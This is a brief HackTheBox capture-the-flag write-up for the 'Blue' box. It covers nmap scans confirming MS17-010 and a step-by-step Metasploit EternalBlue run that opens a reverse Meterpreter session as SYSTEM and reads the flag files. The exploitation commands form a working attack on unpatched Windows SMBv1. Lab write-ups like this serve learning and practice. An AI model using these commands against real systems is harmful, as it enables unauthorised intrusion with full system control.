Blue

HackTheBox, Easy

Blue is a Windows 7 SP1 host missing the MS17-010 patch. EternalBlue (CVE-2017-0144), the leaked NSA SMBv1 exploit used by WannaCry, gives remote code execution as SYSTEM.

Reconnaissance

Nmap shows only RPC and SMB, on Windows 7 Professional 7601 SP1 with message signing disabled on SMBv1. The smb-vuln-ms17-010 script confirms the bug.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p135,139,445 <IP>
# 445 Windows 7 Professional 7601 Service Pack 1
nmap -p445 --script smb-vuln-ms17-010 <IP>
# State: VULNERABLE

Exploitation - MS17-010

EternalBlue abuses a size-conversion bug in SMBv1's handling of extended attributes to corrupt kernel memory. The Metasploit module delivers the Meterpreter straight as SYSTEM.

msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST tun0
run
getuid
shell
type C:\Users\haris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
